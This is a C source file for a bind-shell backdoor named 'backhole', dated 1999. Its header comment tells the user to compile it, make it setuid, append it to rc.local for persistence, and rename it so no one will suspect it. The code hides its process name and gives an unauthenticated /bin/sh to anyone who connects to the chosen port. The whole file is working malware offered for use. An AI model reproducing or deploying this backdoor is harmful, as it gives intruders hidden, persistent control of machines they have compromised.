/*
   I needed a basic backdoor and most of the ones I ran across had so
   many bells and whistles, or were coded in eLe3t c0d3 that they were
   useless. I didn't need something that took a week to figure out and
   configure, and I didn't need shit that was made as a joke. This is a
   small, portable, and functional fake daemon. You tell it what you want
   it to run as under 'ps' and what port to bind to in the defines below.
   The smart thing to do would be to put this into the rc files so it will
   start up if they find you and reboot. I'd also change it's name to
   something no one will suspect. PS. if you think this is gay, fuck you..

   to complie:
   # gcc backhole.c -o backhole 

   to run:
   # ./backhole &
   i.e. # mv backhole /some/path/fakemail
        # chmod 4770 /path/to/fakemail
        # echo "/path/to/fakemail &" >> /etc/rc.d/rc.local
        # /path/to/fakemail &


   coded by Bronc Buster
   Feb 1999
*/

#include <stdio.h>
#include <errno.h>
#include <signal.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <strings.h>

/*****************************************************/
/*  Changes these two defines or this won't work! <g>*/
/*****************************************************/

/*  Change P to be the port you want this to listen on */
#define P 12345

/*  Change HIDE to the name you want this to show as in a ps */
#define HIDE "I_did_not_change_HIDE"

#define SH "/bin/sh"
#define LISTN 5

int main(int argc, char **argv)
{

/* welcome mesg */
char *fst = "\nConnected!\n\n";
char *sec = "This fine tool coded by Bronc Buster\n";
char *thr = "Please enter each command followed by ';'\n";

int outsock, insock, sz; 

/* set up two structs for in and out */
struct sockaddr_in home;
struct sockaddr_in away;
/* set port, proto and bzero for BIND */
home.sin_family=AF_INET;
home.sin_port=htons(P);
home.sin_addr.s_addr=INADDR_ANY;
bzero(&(home.sin_zero),8);

/* changing the name that will appear */
strcpy(argv[0],HIDE);

/* catch the SIG */
signal(SIGCHLD,SIG_IGN);

/* here we go! */
if((outsock=socket(AF_INET,SOCK_STREAM,0))<0)
  exit(printf("Socket error\n"));

if((bind(outsock,(struct sockaddr *)&home,sizeof(home))<0))
  exit(printf("Bind error\n"));

if((listen(outsock,LISTN))<0)
  exit(printf("Listen error\n"));

sz=sizeof(struct sockaddr_in);

/* infinate loop - wait for accept*/
for(;;)
  {
  if((insock=accept(outsock,(struct sockaddr *)&away, &sz))<0)
    exit(printf("Accept error"));
  if(fork() !=0)
    {
    send(insock,fst,strlen(fst),0); /* send out welcome mesg */
    send(insock,sec,strlen(sec),0);
    send(insock,thr,strlen(thr),0);
    dup2(insock,0); /* open stdin  */
    dup2(insock,1); /* open stdout */
    dup2(insock,2); /* open stderr */
    execl(SH,SH,(char *)0); /* start our shell */
    close(insock);
    exit(0); /* all done, leave and close sock */
    }
  close(insock);
  }
}

/* EOF */

